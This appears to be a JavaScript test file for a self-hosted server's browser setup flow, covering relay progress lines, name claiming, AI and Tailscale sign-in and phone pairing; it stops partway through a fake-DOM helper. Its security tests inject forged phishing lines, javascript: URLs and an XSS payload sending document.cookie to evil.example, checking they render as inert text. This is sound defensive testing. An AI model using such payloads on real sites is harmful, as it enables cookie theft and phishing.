// @ts-check
// The setup page's flow and screen against the real relay client and the real Node relay server. The box's
// offer is the one thing faked (it needs a whole daemon; core/relay/setup.test.js covers that half).
import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import * as client from "../../relay/client/setup.js";
import { createRelay } from "../../relay/node/server.js";
import * as wire from "../../core/relay/wire.js";
import { createFlow, MESSAGES, MAX_LINES, suggestName } from "./flow.js";
import { render, h } from "./ui.js";

/** A relay on a free port, and the install script's side of the mailbox (the same POSTs install-box.sh makes). */
async function world(t) {
  const relay = createRelay({});
  const base = await relay.listen();
  t.after(() => relay.close());
  const http = base.replace(/^ws/, "http");
  return {
    base,
    /** Post a line for a code, as the install script would (or as anyone who saw the code could). */
    async post(code, text, seq) {
      const c = wire.parseSetupCode(code);
      const loc = wire.setupDerive("loc", c.secret).toString("base64url");
      const body = { loc, fp: c.fp.toString("base64url"), wtok: wire.setupDerive("mbxw", c.secret).toString("base64url") };
      if (text !== null) body.line = wire.mbxSeal(c.secret, seq, text);
      const r = await fetch(`${http}/v1/setup/mbx`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
      return r.status;
    },
  };
}
const until = async (fn, ms = 5000) => { const end = Date.now() + ms; while (Date.now() < end) { const v = fn(); if (v) return v; await new Promise(r => setTimeout(r, 15)); } throw new Error("timed out waiting"); };
const fastSleep = () => new Promise(r => setTimeout(r, 5));

/** The client with resolveSetup replaced: the box's offer appears after `after` tries (or is contested). */
const clientWith = (resolve) => ({ ...client, resolveSetup: resolve });
const offer = () => ({ offer: { relay: "ws://x", route: "r".repeat(26), box: crypto.randomBytes(32), secret: "s" }, name: "Harlow Legal server", fingerprint: "ab12 cd34", handle: null, identity: null });

test("flow: a code and its install line are made, the steps stream in as plain lines, and the box's offer means found", async t => {
  const w = await world(t);
  let tries = 0;
  const seen = [];
  const flow = createFlow({ client: clientWith(async () => { if (++tries < 3) throw Object.assign(new Error("gone"), { code: "ticket_gone" }); return offer(); }),
    relay: w.base, sleep: fastSleep, pollMs: 5, onChange: s => seen.push(s.stage) });
  await flow.begin();
  const s = flow.state;
  assert.equal(s.stage, "install");
  assert.match(s.installLine, /^curl -fsSL https:\/\/vyre\.run\/i \| VYRE_CODE=[A-Za-z0-9_-]{43} sh$/, "the variable is on sh, the reader of the script");
  assert.equal(s.code.length, 43);
  await w.post(s.code, "[1/5] Checking Docker", 0);
  await w.post(s.code, "done: Docker, Compose and the TUN device are there", 1);
  const found = await until(() => flow.state.stage === "found" && flow.state);
  assert.equal(found.box.name, "Harlow Legal server");
  assert.equal(found.box.words.length, 4);
  assert.ok(found.box.words.every(x => /^[a-z]+$/.test(x)));
  await until(() => flow.state.lines.length === 2);
  assert.deepEqual(flow.state.lines, ["[1/5] Checking Docker", "done: Docker, Compose and the TUN device are there"]);
  assert.ok(seen.indexOf("install") < seen.indexOf("found"));
  flow.stop();
});

test("flow: a forged 'Done, open https://...' line is shown as text and moves nothing", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const code = flow.state.code;
  // Anyone who saw the code can post a well-formed line; this one says the install is over and points somewhere else.
  await w.post(code, "Done. Back to your browser. Open https://evil.example/claim?c=1 to finish", 0);
  await w.post(code, "<img src=x onerror=alert(1)><a href=\"https://evil.example\">Continue</a>", 1);
  await until(() => flow.state.lines.length === 2);
  assert.equal(flow.state.stage, "install", "no line changes where the flow is");
  assert.equal(flow.state.box, null);

  // The screen: text nodes only.
  const doc = new FakeDoc();
  const root = doc.createElement("main");
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
  const text = root.textContent;
  assert.ok(text.includes("Open https://evil.example/claim?c=1 to finish"), "shown as words");
  assert.ok(text.includes("<img src=x onerror=alert(1)><a href=\"https://evil.example\">Continue</a>"), "markup is shown, not made");
  assert.equal(root.all().filter(e => e.tag === "a" || e.tag === "img").length, 0, "no link or image was made from a line");
  assert.equal(doc.innerHtmlWrites, 0);
  assert.ok(!root.all().some(e => (e.attrs.href || "").includes("evil")), "no href points at a line's address");
  flow.stop();
});

test("flow: a contested code, a bad line, and an expired hour each stop the page with the plain message", async t => {
  // Contested: the relay says two servers used the code.
  const w = await world(t);
  const contested = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("x"), { code: "contested" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await contested.begin();
  await until(() => contested.state.stage === "stopped");
  assert.equal(contested.state.error.message, "Two servers used this code. Start again.");

  // A line the page cannot verify (posted at the wrong position) stops it.
  const bad = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await bad.begin();
  await w.post(bad.state.code, "hello", 5);
  await until(() => bad.state.stage === "stopped");
  assert.equal(bad.state.error.code, "bad_line");
  assert.equal(bad.state.error.message, MESSAGES.bad_line);

  // Expired: the hour runs out.
  let clock = 1_000_000;
  const exp = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, now: () => clock,
    sleep: async ms => { clock += ms; await new Promise(r => setTimeout(r, 2)); }, pollMs: 5 });
  await exp.begin();
  await until(() => exp.state.stage === "stopped");
  assert.equal(exp.state.error.message, "This code has expired. Start again.");
  for (const f of [contested, bad, exp]) f.stop();
});

test("flow: starting again makes a new code and the old one's loops end", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const first = flow.state.code;
  await w.post(first, "first run line", 0);
  await until(() => flow.state.lines.length === 1);
  await flow.begin();
  assert.notEqual(flow.state.code, first);
  assert.deepEqual(flow.state.lines, [], "the old run's lines are gone");
  await w.post(first, "a late line for the old code", 1);
  await new Promise(r => setTimeout(r, 120));
  assert.deepEqual(flow.state.lines, [], "nothing from the old code lands on the new run");
  flow.stop();
});

test("flow: the lines kept are capped, and each is cut to a sane length", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const code = flow.state.code;
  for (let i = 0; i < 5; i++) await w.post(code, "x".repeat(900), i);
  await until(() => flow.state.lines.length === 5);
  assert.ok(flow.state.lines.every(l => l.length <= 400));
  assert.ok(MAX_LINES >= 100);
  flow.stop();
});

/** A fake box channel: names.check answers by a rule, names.claim by another; every call is recorded. */
function fakeBox({ check, claim } = {}) {
  const calls = [];
  const ch = {
    calls, closed: false,
    async call(tool, input) {
      calls.push([tool, input]);
      if (tool === "names.check") return (check || (n => ({ name: n, valid: true, available: true, why: null, address: `${n}.vyre.run` })))(input.name);
      if (tool === "names.claim") return (claim || (n => ({ phase: "dns", address: `https://${n}.vyre.run`, recoveryCode: "abcd-efgh-jklm-npqr-stuv-wxyz-23" })))(input.name);
      throw new Error("no such tool");
    },
    close() { ch.closed = true; },
  };
  return ch;
}
/** A flow whose box offer appears at once and whose connection is `box`. */
async function foundFlow(t, box, extra = {}) {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { if (extra.connectFails) throw new Error("no"); return box; }, ...extra.flow });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  if (!extra.unconfirmed) flow.confirmWords();
  return flow;
}

test("naming: a first name is guessed from the server's name and checked live, and only the newest answer counts", async t => {
  assert.equal(suggestName("Harlow Legal server"), "harlow-legal-server");
  assert.equal(suggestName("  Northwind's Bakery!! "), "northwind-s-bakery");
  assert.equal(suggestName("!!!"), "");
  const box = fakeBox({ check: n => ({ name: n, valid: true, available: n !== "taken", why: n === "taken" ? "someone else has that name" : null, address: `${n}.vyre.run` }) });
  const flow = await foundFlow(t, box);
  await until(() => flow.state.channel === "ready" && flow.state.naming.check);
  assert.equal(flow.state.naming.input, "harlow-legal-server");
  assert.equal(flow.state.naming.check.available, true);
  // typing fast: three keystrokes, one check, and it is for the last one
  const before = box.calls.length;
  flow.setName("t"); flow.setName("ta"); flow.setName("taken");
  await until(() => flow.state.naming.check && flow.state.naming.check.name === "taken");
  assert.equal(box.calls.length - before, 1, "one check for three keystrokes");
  assert.equal(flow.state.naming.check.available, false);
  assert.equal(flow.state.naming.check.why, "someone else has that name");
  await flow.claim();
  assert.equal(flow.state.stage, "found", "an unavailable name is not claimed");
  assert.ok(!box.calls.some(c => c[0] === "names.claim"));
  flow.stop();
  assert.equal(box.closed, true, "the connection is closed with the page");
});

test("naming: claiming a free name shows the recovery code once, and a refusal keeps the person on the form", async t => {
  const box = fakeBox();
  const flow = await foundFlow(t, box);
  await until(() => flow.state.naming.check);
  await flow.claim();
  assert.equal(flow.state.stage, "named");
  assert.equal(flow.state.named.name, "harlow-legal-server");
  assert.equal(flow.state.named.address, "https://harlow-legal-server.vyre.run");
  assert.equal(flow.state.named.recoveryCode, "abcd-efgh-jklm-npqr-stuv-wxyz-23");
  flow.stop();

  const bad = fakeBox({ claim: () => { throw Object.assign(new Error("that name was taken a moment ago"), { code: "conflict" }); } });
  const f2 = await foundFlow(t, bad);
  await until(() => f2.state.naming.check);
  await f2.claim();
  assert.equal(f2.state.stage, "found");
  assert.equal(f2.state.naming.error, "that name was taken a moment ago");
  assert.equal(f2.state.naming.claiming, false);
  f2.stop();

  const failed = fakeBox({ claim: () => ({ phase: "failed", why: "the directory would not answer" }) });
  const f3 = await foundFlow(t, failed);
  await until(() => f3.state.naming.check);
  await f3.claim();
  assert.equal(f3.state.stage, "found");
  assert.equal(f3.state.naming.error, "the directory would not answer");
  f3.stop();
});

test("naming: a connection that cannot be opened says so in plain words", async t => {
  const flow = await foundFlow(t, fakeBox(), { connectFails: true });
  await until(() => flow.state.channel === "failed");
  assert.equal(flow.state.error.message, MESSAGES.connect);
  flow.stop();
});

test("screen: the name field keeps its element (and so its caret) while progress lines arrive, and the claim button follows the check", async t => {
  const box = fakeBox({ check: n => ({ name: n, valid: n.length > 2, available: n.length > 2, why: n.length > 2 ? null : "too short", address: `${n}.vyre.run` }) });
  const w = await world(t);
  const doc = new FakeDoc();
  const root = doc.createElement("main");
  const typed = [];
  const actions = { begin() {}, copy() {}, setName: x => typed.push(x), claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved() {} };
  const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  assert.equal(root.all().find(e => e.tag === "input"), undefined, "no name form before the words are confirmed");
  const confirmBtn = root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "These match my server's terminal"));
  assert.ok(confirmBtn, "the one click is there");
  confirmBtn.listeners.click();
  await until(() => flow.state.naming.check);
  const input = () => root.all().find(e => e.tag === "input");
  const claimBtn = () => root.all().find(e => e.attrs["data-role"] === "claim");
  const first = input();
  assert.ok(first, "the form is there");
  assert.equal(claimBtn().attrs.disabled, undefined, "a free name can be claimed");
  await w.post(flow.state.code, "a late progress line", 0);
  await until(() => flow.state.lines.length === 1);
  assert.equal(input(), first, "the same input element after a progress line");
  first.listeners.input({ currentTarget: { value: "ab" } });
  assert.deepEqual(typed, ["ab"]);
  await flow.setName("ab");
  await until(() => flow.state.naming.check && flow.state.naming.check.name === "ab");
  assert.equal(input(), first, "the same input element after a check");
  assert.equal(claimBtn().attrs.disabled, "disabled", "a name that is not free cannot be claimed");
  assert.ok(root.textContent.includes("too short"));
  flow.stop();
});

test("words: nothing opens, and no name form shows, until the person says the four words match; a mismatch stops it", async t => {
  const box = fakeBox();
  let connects = 0;
  const w = await world(t);
  const mk = () => createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { connects++; return box; } });
  const flow = mk();
  await flow.begin();
  await until(() => flow.state.stage === "found");
  assert.equal(flow.state.confirm, "pending");
  await new Promise(r => setTimeout(r, 80));
  assert.equal(connects, 0, "an offer alone opens nothing");
  assert.equal(flow.state.channel, "none");
  await flow.claim();
  assert.equal(flow.state.stage, "found");
  flow.confirmWords();
  await until(() => flow.state.channel === "ready");
  assert.equal(connects, 1);
  flow.stop();

  const other = mk();
  await other.begin();
  await until(() => other.state.stage === "found");
  other.denyWords();
  assert.equal(other.state.stage, "stopped");
  assert.equal(other.state.error.message, MESSAGES.mismatch);
  await new Promise(r => setTimeout(r, 50));
  assert.equal(connects, 1, "a mismatch never connects");
  other.stop();
});

test("recovery code: it stays until 'I saved it', the screen warns, and saving drops the code from the page", async t => {
  const flow = await foundFlow(t, fakeBox());
  await until(() => flow.state.naming.check);
  await flow.claim();
  assert.equal(flow.state.named.saved, false);
  const doc = new FakeDoc(), root = doc.createElement("main");
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved: () => flow.markSaved() };
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  assert.ok(root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"));
  assert.ok(root.textContent.includes("clipboard"), "the clipboard-history note");
  assert.ok(root.textContent.includes("If you close it or reload before you have saved the code, it is gone."));
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "I saved it")).listeners.click();
  assert.equal(flow.state.named.saved, true);
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  assert.ok(!root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"), "the code leaves the page once it is saved");
  flow.stop();
});

test("forged lines: an <img onerror> payload and a very long line are text, capped, and change nothing", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  await flow.begin();
  const payload = `<img src=x onerror="fetch('https://evil.example/?'+document.cookie)"><script>alert(1)</script>`;
  await w.post(flow.state.code, payload, 0);
  await w.post(flow.state.code, "A".repeat(1000), 1);
  await until(() => flow.state.lines.length === 2);
  assert.equal(flow.state.stage, "install");
  assert.equal(flow.state.lines[0], payload, "kept as the words it is");
  assert.equal(flow.state.lines[1].length, 400, "a long line is cut");
  const doc = new FakeDoc(), root = doc.createElement("main");
  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
  assert.deepEqual(root.all().filter(e => ["img", "script", "a", "iframe"].includes(e.tag)).map(e => e.tag), [], "no element is made from a line");
  assert.ok(root.textContent.includes(payload), "the markup is shown as text");
  assert.equal(doc.innerHtmlWrites, 0);
  flow.stop();
});

/** A fake box for the later steps: Tailscale and provider sign-ins follow a script the test drives. */
function stepsBox(script = {}) {
  const box = fakeBox();
  const base = box.call;
  const st = { ts: "needs-login", kind: "personal", loginUrl: "https://login.tailscale.com/a/abc123", claimPhase: "dns", flows: {}, ...script };
  box.st = st;
  box.call = async (tool, input) => {
    if (tool === "network.tailscale.status") { box.calls.push([tool, input]); return { state: st.ts, login: "alex@example.com", tailnet: "alex.example", tailnetKind: st.kind, ip: st.ts === "connected" ? "100.64.0.9" : null }; }
    if (tool === "network.tailscale.login") { box.calls.push([tool, input]); return { loginUrl: st.loginUrl, state: "needs-login" }; }
    if (tool === "names.claim" && st.claimPhase) { box.calls.push([tool, input]); return { phase: st.claimPhase, address: "https://harlow-legal-server.vyre.run", recoveryCode: st.ts === "connected" ? null : "abcd-efgh-jklm-npqr-stuv-wxyz-23" }; }
    if (tool === "sessions.accounts.signin") {
      box.calls.push([tool, input]);
      if (input.provider) { const flow = `f-${input.provider}`; st.flows[flow] = { provider: input.provider, polls: 0 }; return input.provider === "claude" ? { flow, step: "url", url: "https://claude.ai/oauth/authorize?x=1", paste: true } : { flow, step: "code", url: "https://example.org/device", code: "WXYZ-1234" }; }
      const f = st.flows[input.flow];
      if (input.code) { f.done = input.code === "good-code"; return f.done ? { step: "waiting" } : { step: "failed", why: "that code did not work" }; }
      f.polls++;
      return f.provider === "claude" ? { step: f.done ? "done" : "url" } : { step: f.polls >= 2 ? "done" : "code" };
    }
    if (tool === "relay.pair.ticket") { box.calls.push([tool, input]); if (st.ticketMade) throw Object.assign(new Error("the setup page has already made its one pairing ticket"), { code: "denied" }); st.ticketMade = true; return { ticket: "AAECAwQFBgc", expiresAt: Date.now() + (st.ticketMs ?? 300_000), connected: true }; }
    return base(tool, input);
  };
  box.events = async (type, since) => { box.calls.push(["events", { type, since }]); return (st.paired || []).filter(e => e.type === type && e.id > since); };
  return box;
}
async function atNamed(t, box) {
  const flow = await foundFlow(t, box);
  await until(() => flow.state.naming.check);
  await flow.claim();
  flow.markSaved();
  return flow;
}

test("steps: AI sign-in comes before Tailscale, needs one done login, and a pasted code finishes the ones that want it", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  flow.continueToTailscale();
  assert.equal(flow.state.stage, "named", "Tailscale is not reachable from the naming screen");
  flow.continueToAi();
  assert.equal(flow.state.stage, "ai");
  flow.continueToTailscale();
  assert.equal(flow.state.stage, "ai", "no login is done yet");

  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].code === "WXYZ-1234");
  assert.equal(flow.state.ai.accounts[0].url, "https://example.org/device");
  await until(() => flow.state.ai.accounts[0].step === "done");
  assert.ok(box.calls.some(c => c[0] === "sessions.accounts.signin" && c[1].flow === "f-codex"), "it polled with the flow");

  flow.startAi("claude");
  await until(() => flow.state.ai.accounts.find(a => a.provider === "claude" && a.step === "url"));
  const claude = () => flow.state.ai.accounts.find(a => a.provider === "claude");
  assert.equal(claude().paste, true);
  await flow.submitAiCode(claude().id, "bad-code");
  assert.equal(claude().step, "failed");
  assert.equal(claude().error, "that code did not work");
  flow.startAi("claude");
  await until(() => flow.state.ai.accounts.filter(a => a.provider === "claude").some(a => a.step === "url"));
  const again = flow.state.ai.accounts.find(a => a.provider === "claude" && a.step === "url");
  await flow.submitAiCode(again.id, "good-code");
  await until(() => flow.state.ai.accounts.find(a => a.id === again.id).step === "done");
  flow.continueToTailscale();
  assert.equal(flow.state.stage, "tailscale");
  flow.stop();
});

test("steps: a sign-in link that is not a plain https address is not shown", async t => {
  const box = stepsBox();
  const orig = box.call;
  box.call = async (tool, input) => { const r = await orig(tool, input); return tool === "sessions.accounts.signin" && input.provider ? { ...r, url: "javascript:alert(1)" } : r; };
  const flow = await atNamed(t, box);
  flow.continueToAi();
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].error);
  assert.equal(flow.state.ai.accounts[0].url, null);
  assert.match(flow.state.ai.accounts[0].error, /not a plain https address/);
  flow.stop();
});

test("steps: Tailscale shows a checked sign-in link, waits for the join, then publishes the address once and stops", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  flow.continueToAi(); flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.continueToTailscale();
  await until(() => flow.state.tailscale.status);
  assert.equal(flow.state.tailscale.status.state, "needs-login");
  await flow.connectTailscale();
  assert.equal(flow.state.tailscale.loginUrl, "https://login.tailscale.com/a/abc123");
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  const claims = box.calls.filter(c => c[0] === "names.claim").length;
  await new Promise(r => setTimeout(r, 60));
  assert.equal(box.calls.filter(c => c[0] === "names.claim").length, claims, "no more claims once it is serving");
  assert.equal(flow.state.tailscale.loginUrl, null, "the link is dropped once connected");
  flow.stop();

  // Not Tailscale's page: refused.
  const bad = stepsBox({ loginUrl: "https://evil.example/login" });
  const f2 = await atNamed(t, bad);
  f2.continueToAi(); f2.startAi("codex");
  await until(() => f2.state.ai.accounts[0] && f2.state.ai.accounts[0].step === "done");
  f2.continueToTailscale();
  await f2.connectTailscale();
  assert.equal(f2.state.tailscale.loginUrl, null);
  assert.match(f2.state.tailscale.error, /not Tailscale's/);
  f2.stop();
});

test("steps: the screens render, links are real https anchors only where the box's link was checked, and the pasted-code field keeps its element", async t => {
  const box = stepsBox({ ts: "connected", kind: "organization", claimPhase: "certificate" });
  const doc = new FakeDoc(), root = doc.createElement("main");
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale: () => flow.connectTailscale(), startAi: p => flow.startAi(p), submitAiCode: (i, c) => flow.submitAiCode(i, c) };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToAi();
  flow.startAi("claude");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "url");
  const anchors = () => root.all().filter(e => e.tag === "a");
  assert.deepEqual(anchors().map(a => a.attrs.href), ["https://claude.ai/oauth/authorize?x=1"]);
  assert.ok(anchors().every(a => a.attrs.rel.includes("noopener") && a.attrs.target === "_blank"));
  const field = () => root.all().find(e => e.tag === "input" && e.attrs.name === "code");
  const first = field();
  assert.ok(first);
  await w.post(flow.state.code, "a progress line while the code is being typed", 0);
  await until(() => flow.state.lines.length === 1);
  assert.equal(field(), first, "the same field after a progress line");
  first.value = "good-code";
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Finish")).listeners.click();
  await until(() => flow.state.ai.accounts[0].step === "done");
  flow.continueToTailscale();
  await until(() => flow.state.tailscale.address);
  assert.ok(root.textContent.includes("This is a work network"), "the work-network warning");
  assert.ok(root.textContent.includes("Publishing your address"));
  flow.stop();
});

async function atDevices(t, box, extra = {}) {
  const flow = await atNamed(t, box);
  flow.continueToAi(); flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.continueToTailscale();
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  flow.continueToDevices();
  return flow;
}

test("devices: one ticket, drawn but never written as text, and a pairing after it moves the page on", async t => {
  const box = stepsBox();
  const flow = await atDevices(t, box);
  assert.equal(flow.state.stage, "devices");
  assert.equal(flow.currentTicket(), null, "no ticket until the person asks");
  await flow.addPhone();
  assert.equal(flow.state.devices.phone, "showing");
  assert.equal(flow.currentTicket(), "AAECAwQFBgc", "held only for drawing");
  assert.ok(!JSON.stringify(flow.state).includes("AAECAwQFBgc"), "the ticket is not in the state the screen is built from");
  // a phone pairs: an event after the moment the ticket was made
  box.st.paired = [{ id: 7, type: "relay.paired", payload: { name: "Alex's iPhone", device: "d1" } }];
  await until(() => flow.state.devices.phone === "paired");
  assert.equal(flow.state.devices.paired, "Alex's iPhone");
  assert.equal(flow.currentTicket(), null, "the ticket is dropped once it is spent");
  await flow.addPhone();
  assert.equal(box.calls.filter(c => c[0] === "relay.pair.ticket").length, 1, "only one ticket");
  flow.stop();
});

test("devices: an earlier pairing does not count, and a ring that is not scanned in time says it expired", async t => {
  const box = stepsBox({ ticketMs: 120, paired: [{ id: 3, type: "relay.paired", payload: { name: "old" } }] });
  const flow = await atDevices(t, box);
  await flow.addPhone();
  await until(() => flow.state.devices.phone === "expired");
  assert.equal(flow.currentTicket(), null);
  assert.equal(flow.state.devices.paired, null, "the earlier event was not taken for this pairing");
  flow.stop();

  const failing = stepsBox({ ticketMade: true });
  const f2 = await atDevices(t, failing);
  await f2.addPhone();
  assert.equal(f2.state.devices.phone, "failed");
  assert.match(f2.state.devices.error, /already made its one pairing ticket/);
  f2.stop();
});

test("devices: the screen draws the ring into its slot only while showing, and never prints the ticket", async t => {
  const box = stepsBox();
  const doc = new FakeDoc(), root = doc.createElement("main");
  const drawn = [];
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale() {}, startAi: p => flow.startAi(p), submitAiCode() {},
    continueToDevices: () => flow.continueToDevices(), addPhone: () => flow.addPhone(), drawRing: slot => drawn.push(slot.attrs["data-role"]) };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToAi(); flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.continueToTailscale();
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Continue")).listeners.click();
  assert.equal(flow.state.stage, "devices");
  assert.deepEqual(drawn, []);
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Add my phone")).listeners.click();
  await until(() => drawn.length === 1);
  assert.deepEqual(drawn, ["ring"]);
  assert.ok(!root.textContent.includes("AAECAwQFBgc"), "the ticket is not printed");
  await new Promise(r => setTimeout(r, 40));
  assert.equal(drawn.length, 1, "drawn once, not on every poll");
  flow.stop();
});

test("site: the phone's ring is plain SVG shapes: no script, style, link or handler for the page's CSP to refuse", async () => {
  const { ticketRingSvg } = await import("../../deck/js/phone-code.js");
  const svg = ticketRingSvg("AAECAwQFBgc", { size: 280 });
  assert.ok(svg.startsWith("<svg"));
  assert.ok(!/<script|<style|style=|href=|xlink|on\w+=/i.test(svg));
});

test("tailscale: with the box's event stream it reads status when told, not on a clock; a broken stream falls back to a capped poll that stops on an error", async t => {
  const box = stepsBox();
  let poke = () => {}, endStream = () => {};
  let followed = 0;
  box.follow = (type, onEvent, onEnd) => { followed++; assert.equal(type, "tailscale.changed"); poke = () => onEvent({ type }); endStream = err => onEnd(err); return () => {}; };
  const flow = await atNamed(t, box);
  flow.continueToAi(); flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.continueToTailscale();
  await until(() => flow.state.tailscale.status && followed === 1);
  const statusCalls = () => box.calls.filter(c => c[0] === "network.tailscale.status").length;
  const first = statusCalls();
  await new Promise(r => setTimeout(r, 120));
  assert.equal(statusCalls(), first, "nothing reads status while the box is quiet");
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  poke();
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  assert.ok(statusCalls() > first, "an event was a reason to read");
  flow.stop();

  // The stream breaks: the capped poll takes over, and an error from the box ends the watching.
  const b2 = stepsBox();
  b2.follow = (type, onEvent, onEnd) => { setTimeout(() => onEnd(new Error("stream broke")), 10); return () => {}; };
  const f2 = await atNamed(t, b2);
  f2.continueToAi(); f2.startAi("codex");
  await until(() => f2.state.ai.accounts[0] && f2.state.ai.accounts[0].step === "done");
  f2.continueToTailscale();
  await until(() => b2.calls.filter(c => c[0] === "network.tailscale.status").length >= 3);
  const orig = b2.call;
  b2.call = async (tool, input) => { if (tool === "network.tailscale.status") throw Object.assign(new Error("this setup session has ended"), { code: "setup_over", status: 401 }); return orig(tool, input); };
  await until(() => f2.state.tailscale.error);
  const n = b2.calls.length;
  await new Promise(r => setTimeout(r, 80));
  assert.equal(b2.calls.length, n, "no more calls after the error");
  f2.stop();
});

test("ai: with a list of provider hosts, a sign-in link elsewhere is refused", async t => {
  const box = stepsBox();
  const flow = await foundFlow(t, box, { flow: { signinHosts: ["example.org", "claude.ai"] } });
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToAi();
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  assert.equal(flow.state.ai.accounts[0].error, null);
  const orig = box.call;
  box.call = async (tool, input) => { const r = await orig(tool, input); return tool === "sessions.accounts.signin" && input.provider === "grok" ? { ...r, url: "https://login.evil.example/x" } : r; };
  flow.startAi("grok");
  await until(() => flow.state.ai.accounts.find(a => a.provider === "grok" && a.error));
  assert.equal(flow.state.ai.accounts.find(a => a.provider === "grok").step, "failed");
  flow.stop();
});

// ---- a DOM just big enough to check what the screen makes ----
class FakeEl {
  constructor(tag, doc) { this.tag = tag; this.doc = doc; this.attrs = {}; this.children = []; this.text = null; this.listeners = {}; }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  getAttribute(k) { return k in this.attrs ? this.attrs[k] : null; }
  appendChild(c) { this.children.push(c); return c; }
  replaceChildren(...c) { this.children = c; }
  addEventListener(n, f) { this.listeners[n] = f; }
  removeAttribute(k) { delete this.attrs[k]; }
  querySelector(sel) { return this.all().find(e => e.tag === sel) || null; }
